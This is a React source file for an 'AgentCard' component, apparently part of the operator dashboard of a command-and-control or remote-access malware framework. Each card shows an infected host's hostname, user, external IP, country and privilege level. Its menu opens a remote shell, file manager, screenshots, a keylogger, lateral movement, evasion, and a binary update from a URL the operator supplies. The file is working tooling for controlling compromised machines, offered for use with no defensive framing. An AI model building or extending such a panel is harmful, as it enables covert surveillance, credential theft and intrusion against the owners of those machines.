import { NavLink } from 'react-router-dom'
import { formatDistanceToNow } from 'date-fns'
import {
  Monitor,
  User,
  Cpu,
  Shield,
  MapPin,
  Tag,
  MoreVertical,
  Terminal,
  Key,
  Wifi,
  WifiOff,
  Trash2,
  Copy,
  Eye,
  Play,
  Pause,
  Power,
  RefreshCw,
  FileText,
  Keyboard,
  Zap,
  Bug,
  Database,
  Globe,
  Lock,
  Unlock,
  ArrowRightLeft,
  CheckCircle,
  AlertTriangle,
  XCircle,
  ChevronLeft,
  ChevronRight,
  Home,
  Download,
  Upload,
} from 'lucide-react'
import { useStore } from '@/stores/useStore'
import { api } from '@/services/api'
import { GradientText } from '@/components/ui/GradientText'
import { DotGrid } from '@/components/ui/DotGrid'
import { Button } from '@/components/ui/Button'
import { Badge } from '@/components/ui/Badge'
import { Card, CardBody } from '@/components/ui/Card'
import clsx from 'clsx'
import { useState } from 'react'

type AgentStatus = 'online' | 'offline' | 'stale' | 'dead'

const statusConfig: Record<AgentStatus, { icon: any; color: string; bg: string; label: string; border: string }> = {
  online: { icon: CheckCircle, color: 'text-green-500', bg: 'bg-green-500', label: 'Online', border: 'border-green-500/50' },
  offline: { icon: XCircle, color: 'text-red-500', bg: 'bg-red-500', label: 'Offline', border: 'border-red-500/50' },
  stale: { icon: AlertTriangle, color: 'text-yellow-500', bg: 'bg-yellow-500', label: 'Stale', border: 'border-yellow-500/50' },
  dead: { icon: XCircle, color: 'text-red-500', bg: 'bg-red-500', label: 'Dead', border: 'border-red-500/50' },
}

export function AgentCard({ agent }: { agent: any }) {
  const { setSelectedAgent, removeAgent, addNotification } = useStore()
  const [showMenu, setShowMenu] = useState(false)

  const status: AgentStatus = agent.status || 'offline'
  const cfg = statusConfig[status] || statusConfig.offline
  const StatusIcon = cfg.icon
  const lastSeen = agent.last_seen ? formatDistanceToNow(new Date(agent.last_seen), { addSuffix: true }) : 'Never'

  const handleAction = async (action: string) => {
    setShowMenu(false)
    try {
      switch (action) {
        case 'shell':
          setSelectedAgent(agent)
          window.location.href = `/agents/${agent.id}?tab=shell`
          break
        case 'files':
          setSelectedAgent(agent)
          window.location.href = `/agents/${agent.id}?tab=files`
          break
        case 'screenshot':
          await api.takeScreenshot(agent.id)
          addNotification({ type: 'success', message: 'Screenshot task queued' })
          break
        case 'keylog':
          setSelectedAgent(agent)
          window.location.href = `/keylogger?agent=${agent.id}`
          break
        case 'processes':
          setSelectedAgent(agent)
          window.location.href = `/processes?agent=${agent.id}`
          break
        case 'lateral':
          setSelectedAgent(agent)
          window.location.href = `/lateral?agent=${agent.id}`
          break
        case 'evasion':
          setSelectedAgent(agent)
          window.location.href = `/evasion?agent=${agent.id}`
          break
        case 'sleep':
          await api.sleep(agent.id, 300)
          addNotification({ type: 'success', message: 'Sleep task queued (5 min)' })
          break
        case 'update':
          const url = prompt('Enter update URL:')
          if (url) {
            await api.updateAgentBinary(agent.id, url)
            addNotification({ type: 'success', message: 'Update task queued' })
          }
          break
        case 'copy_id':
          navigator.clipboard.writeText(agent.id)
          addNotification({ type: 'info', message: 'Agent ID copied' })
          break
        case 'delete':
          if (confirm('Remove agent from dashboard?')) {
            await api.deleteAgent(agent.id)
            removeAgent(agent.id)
            addNotification({ type: 'success', message: 'Agent removed' })
          }
          break
      }
    } catch (error) {
      addNotification({ type: 'error', message: `Action failed: ${error}` })
    }
  }

  const privileges = agent.privileges === 1 ? 'SYSTEM' : agent.privileges === 2 ? 'ADMIN' : 'USER'
  const privColors: Record<string, string> = { SYSTEM: 'text-red-400 bg-red-400/20 border-red-400/30', ADMIN: 'text-orange-400 bg-orange-400/20 border-orange-400/30', USER: 'text-blue-400 bg-blue-400/20 border-blue-400/30' }

  return (
    <Card className="relative overflow-hidden group transition-all duration-300 hover:border-accent-500/50 hover:shadow-lg hover:shadow-accent-500/10">
      <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-accent-500 to-purple-500 opacity-0 group-hover:opacity-100 transition-opacity" />
      <CardBody className="p-5">
        <div className="flex items-start justify-between mb-4">
          <div className="relative w-12 h-12 rounded-xl bg-dark-800/50 border border-dark-700 flex items-center justify-center overflow-hidden flex-shrink-0">
            <DotGrid className="absolute inset-0" dotSize={2} gap={10} baseColor="#1e293b" activeColor="#d946ef" proximity={60} />
            <Monitor className="w-6 h-6 text-accent-400 relative z-10" />
          </div>
          <div className="relative">
            <button onClick={() => setShowMenu(!showMenu)} className="p-1.5 rounded bg-dark-800 hover:bg-dark-700 text-dark-400 hover:text-accent-400 transition-colors">
              <MoreVertical className="w-4 h-4" />
            </button>
            {showMenu && (
              <div className="absolute right-0 top-full mt-2 w-40 bg-dark-900 border border-dark-700 rounded-lg shadow-lg overflow-hidden z-50 animate-fade-in">
                <button onClick={() => handleAction('shell')} className="w-full px-3 py-2 text-left text-sm text-dark-300 hover:bg-dark-800 flex items-center gap-2"><Terminal className="w-4 h-4" /> Shell</button>
                <button onClick={() => handleAction('files')} className="w-full px-3 py-2 text-left text-sm text-dark-300 hover:bg-dark-800 flex items-center gap-2"><FileText className="w-4 h-4" /> File Manager</button>
                <button onClick={() => handleAction('screenshot')} className="w-full px-3 py-2 text-left text-sm text-dark-300 hover:bg-dark-800 flex items-center gap-2"><Monitor className="w-4 h-4" /> Screenshot</button>
                <button onClick={() => handleAction('keylog')} className="w-full px-3 py-2 text-left text-sm text-dark-300 hover:bg-dark-800 flex items-center gap-2"><Keyboard className="w-4 h-4" /> Keylogger</button>
                <button onClick={() => handleAction('processes')} className="w-full px-3 py-2 text-left text-sm text-dark-300 hover:bg-dark-800 flex items-center gap-2"><Cpu className="w-4 h-4" /> Processes</button>
                <button onClick={() => handleAction('lateral')} className="w-full px-3 py-2 text-left text-sm text-dark-300 hover:bg-dark-800 flex items-center gap-2"><ArrowRightLeft className="w-4 h-4" /> Lateral Move</button>
                <button onClick={() => handleAction('evasion')} className="w-full px-3 py-2 text-left text-sm text-dark-300 hover:bg-dark-800 flex items-center gap-2"><Shield className="w-4 h-4" /> Evasion</button>
                <hr className="my-1 border-dark-700" />
                <button onClick={() => handleAction('sleep')} className="w-full px-3 py-2 text-left text-sm text-dark-300 hover:bg-dark-800 flex items-center gap-2"><Pause className="w-4 h-4" /> Sleep (5m)</button>
                <button onClick={() => handleAction('update')} className="w-full px-3 py-2 text-left text-sm text-dark-300 hover:bg-dark-800 flex items-center gap-2"><RefreshCw className="w-4 h-4" /> Update</button>
                <button onClick={() => handleAction('copy_id')} className="w-full px-3 py-2 text-left text-sm text-dark-300 hover:bg-dark-800 flex items-center gap-2"><Copy className="w-4 h-4" /> Copy ID</button>
                <hr className="my-1 border-dark-700" />
                <button onClick={() => handleAction('delete')} className="w-full px-3 py-2 text-left text-sm text-red-400 hover:bg-red-900/20 flex items-center gap-2"><Trash2 className="w-4 h-4" /> Remove</button>
              </div>
            )}
          </div>
        </div>

        <div className="space-y-3">
          <div>
            <GradientText className="text-lg font-bold truncate" colors={['#f8fafc', '#d946ef', '#a855f7']}>
              {agent.hostname}
            </GradientText>
            <p className="text-xs text-dark-500 truncate">{agent.username}</p>
          </div>

          <div className="flex items-center gap-2 flex-wrap">
            <span className={clsx('px-2 py-0.5 rounded text-xs font-medium', cfg.color, cfg.bg + '/20', cfg.border)}>
              <StatusIcon className="w-3 h-3 mr-1" />
              {cfg.label}
            </span>
            <Badge variant="outline" className={privColors[privileges]}>{privileges}</Badge>
          </div>

          <div className="grid grid-cols-2 gap-2 text-xs">
            <div className="flex items-center gap-1.5 text-dark-500">
              <Cpu className="w-3 h-3" />
              <span className="text-dark-400 font-mono">{agent.arch}</span>
            </div>
            <div className="flex items-center gap-1.5 text-dark-500">
              <Globe className="w-3 h-3" />
              <span className="text-dark-400 font-mono truncate">{agent.external_ip}</span>
            </div>
            <div className="flex items-center gap-1.5 text-dark-500">
              <MapPin className="w-3 h-3" />
              <span className="text-dark-400 capitalize">{agent.country_code?.toLowerCase() || 'unknown'}</span>
            </div>
            <div className="flex items-center gap-1.5 text-dark-500">
              <Tag className="w-3 h-3" />
              <span className="text-dark-400">v{agent.build_version}</span>
            </div>
          </div>

          <div className="pt-2 border-t border-dark-800 flex items-center justify-between">
            <span className="text-xs text-dark-500">Last seen</span>
            <span className="text-xs font-mono text-dark-400">{lastSeen}</span>
          </div>
        </div>
      </CardBody>
    </Card>
  )
}